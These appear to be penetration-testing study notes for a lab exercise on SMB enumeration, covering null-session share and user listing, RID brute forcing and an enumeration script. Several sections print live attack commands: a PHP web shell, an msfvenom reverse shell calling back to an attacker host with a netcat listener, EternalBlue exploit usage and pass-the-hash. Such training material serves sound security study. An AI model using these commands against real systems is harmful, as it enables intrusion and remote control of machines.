---
tags: [module/footprinting, smb, samba, windows-sharing, level/advanced, practical]
---

# SMB Enumeration - Practical Application

## Complete SMB Enumeration Workflow

Phase 1: Port Scanning
Phase 2: Share Enumeration
Phase 3: RPC Enumeration
Phase 4: User Enumeration
Phase 5: Group/Permission Analysis
Phase 6: File Download/Upload
Phase 7: Version-Specific Exploitation

---

## Phase 1: Port Scanning

### Nmap SMB Scripts

find /usr/share/nmap/scripts/ -name "smb*" | sort

Key SMB scripts:
- smb-os-discovery.nse
- smb2-capabilities.nse
- smb-enum-shares.nse
- smb-enum-users.nse
- smb-enum-groups.nse
- smb-enum-sessions.nse
- smb-server-stats.nse
- smb-system-info.nse
- smb-security-mode.nse
- smb-vuln-*.nse

### Basic Nmap Scan

sudo nmap -sV -p139,445 -sC 10.129.14.128

### Comprehensive SMB Scan

sudo nmap -p139,445 --script smb-* 10.129.14.128 -oN smb-nmap.txt

### Check SMB Versions Supported

nmap --script smb2-capabilities -p445 10.129.14.128

---

## Phase 2: Share Enumeration

### smbclient - List Shares

smbclient -N -L //10.129.14.128

### smbclient - Connect to Share

smbclient //10.129.14.128/notes -N

### smbmap

smbmap -H 10.129.14.128
smbmap -H 10.129.14.128 -u guest
smbmap -H 10.129.14.128 -u '' -p ''
smbmap -H 10.129.14.128 -R notes -A "*.txt" -q

### CrackMapExec

crackmapexec smb 10.129.14.128 --shares -u '' -p ''
crackmapexec smb 10.129.14.128 --shares -u guest -p ''

### enum4linux-ng

enum4linux-ng.py 10.129.14.128 -A
enum4linux-ng.py 10.129.14.128 -S -U -G

---

## Phase 3: RPC Enumeration (Null Session)

### Connect with rpcclient

rpcclient -U "" -N 10.129.14.128

### Key rpcclient Commands

| Command | Description |
|---------|-------------|
| srvinfo | Server information |
| enumdomains | Enumerate domains |
| querydominfo | Domain information |
| netshareenumall | List all shares |
| netsharegetinfo <share> | Share details |
| enumdomusers | List domain users |
| enumalsgroups builtin | List built-in groups |
| enumalsgroups domain | List domain groups |
| enumdomgroups | List domain groups |
| queryuser <RID> | User details |
| querygroup <RID> | Group details |
| lsaenumsid | List SIDs |

### Example Session

rpcclient $> srvinfo
    DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
    platform_id     :       500
    os version      :       6.1
    server type     :       0x809a03

rpcclient $> enumdomains
name:[DEVSMB] idx:[0x0]
name:[Builtin] idx:[0x1]

rpcclient $> querydominfo
Domain:         DEVOPS
Server:         DEVSMB
Comment:        DEVSM
Total Users:    2
Total Groups:   0
Total Aliases:  0
Server Role:    ROLE_DOMAIN_PDC

rpcclient $> netshareenumall
netname: print$
netname: home
netname: dev
netname: notes
netname: IPC$

rpcclient $> netsharegetinfo notes
netname: notes
path:   C:\mnt\notes\
type:   0x0
perms:  0
SID: S-1-1-0

---

## Phase 4: User Enumeration

### rpcclient User Enum

rpcclient $> enumdomusers
user:[mrb3n] rid:[0x3e8]
user:[cry0l1t3] rid:[0x3e9]

### Get User Details

rpcclient $> queryuser 0x3e9

User Name   :   cry0l1t3
Full Name   :   cry0l1t3
Home Drive  :   \\devsmb\cry0l1t3
Profile Path:   \\devsmb\cry0l1t3\profile
Logon Script:
Password last set Time   :  Wed Sep 22 17:50:56 2021
user_rid :      0x3e9
group_rid:      0x201
acb_info :      0x00000014

### RID Brute Force (Bash)

for i in $(seq 500 1100); do
    rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid" && echo ""
done

### Impacket - samrdump

samrdump.py 10.129.14.128

### Impacket - lookupsid

lookupsid.py anonymous@10.129.14.128

### enum4linux-ng User Enum

enum4linux-ng.py 10.129.14.128 -U

---

## Phase 5: Group and Permission Analysis

### Get Group Info

rpcclient $> querygroup 0x201

Group Name:     None
Description:    Ordinary Users
Group Attribute:7
Num Members:2

### Check Share Permissions

smbmap -H 10.129.14.128 -u '' -p '' -R notes

### Check Write Permissions

Create a test file:
echo "test" > test.txt

Upload via smbclient:
smb: \> put test.txt

Check if it appears:
smb: \> ls

### Check for Dangerous Permissions

Look for:
- Guest ok = yes
- Writable = yes
- Create mask = 0777
- Directory mask = 0777

---

## Phase 6: File Operations

### Download Single File

smb: \> get important.txt

### Download All Files (Recursive)

smbclient //10.129.14.128/notes -N -c "prompt OFF; recurse ON; mget *"

### Upload File

smb: \> put shell.php

### Upload and Execute (if web-accessible)

If share is web-accessible, upload a web shell:

echo '<?php system($_GET["cmd"]); ?>' > shell.php
smb: \> put shell.php

Access via browser:
http://10.129.14.128/shell.php\?cmd\=id

### Upload Reverse Shell

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f elf -o rev.elf
smb: \> put rev.elf

Set up listener:
nc -lvnp 4444

On target (if you have command execution):
chmod +x rev.elf && ./rev.elf

---

## Phase 7: Version-Specific Exploitation

### Check SMB Version

nmap --script smb-protocols -p445 10.129.14.128

### Check for Vulnerabilities

nmap --script smb-vuln* -p445 10.129.14.128

### EternalBlue (MS17-010)

Check:
nmap --script smb-vuln-ms17-010 -p445 10.129.14.128

Exploit:
use exploit/windows/smb/ms17_010_eternalblue

### SMBGhost (CVE-2020-0796)

Check for SMB 3.1.1 compression vulnerability.

### Pass-the-Hash

If you capture NTLM hashes:
crackmapexec smb 10.129.14.128 -u administrator -H <NTLMhash>

---

## Complete Enumeration Script

Save as smb-enum.sh:

#!/bin/bash
TARGET=$1

echo "[*] Starting SMB enumeration on $TARGET"

echo "[*] Nmap scan..."
nmap -p139,445 --script smb-* -oN smb-nmap.txt $TARGET

echo "[*] smbclient share listing..."
smbclient -N -L //$TARGET 2>&1 | tee smb-shares.txt

echo "[*] smbmap enumeration..."
smbmap -H $TARGET -u '' -p '' 2>&1 | tee smbmap.txt

echo "[*] rpcclient enumeration..."
{
    echo "srvinfo"
    echo "enumdomains"
    echo "querydominfo"
    echo "netshareenumall"
    echo "enumdomusers"
    echo "quit"
} | rpcclient -U "" -N $TARGET 2>&1 | tee rpc-enum.txt

echo "[*] RID brute force (500-1100)..."
for i in $(seq 500 1100); do
    rpcclient -N -U "" $TARGET -c "queryuser 0x$(printf '%x\n' $i)" 2>/dev/null | grep -E "User Name|user_rid|group_rid" && echo ""
done | tee smb-users.txt

echo "[*] Enum4linux-ng scan (if installed)..."
if command -v enum4linux-ng.py &> /dev/null; then
    enum4linux-ng.py $TARGET -A | tee enum4linux.txt
fi

echo "[*] SMB enumeration complete. Check output files."

---

## Tool Comparison

| Tool | Best For | Speed | Reliability |
|------|----------|-------|-------------|
| smbclient | Basic share listing/access | Fast | High |
| smbmap | Share permissions | Fast | High |
| rpcclient | Detailed user/group info | Medium | High |
| CrackMapExec | Multi-host, pass-the-hash | Fast | High |
| enum4linux-ng | Comprehensive all-in-one | Slow | Medium |
| Impacket scripts | Advanced enumeration | Medium | High |

---

## Key Takeaways

- Always check for null sessions (anonymous access)
- Use multiple tools - each reveals different info
- rpcclient gives the most detailed information
- RID brute force finds users even if not listed
- Check share permissions for write access
- Writeable shares + web access = RCE
- Document every user, group, and share found
- Version information leads to specific exploits
- Pass-the-hash works if you capture NTLM hashes
- SMBv1 is ancient and vulnerable (EternalBlue)
- smbstatus shows active connections (if you get access)
- Dangerous settings = guest ok, writable, 0777 masks
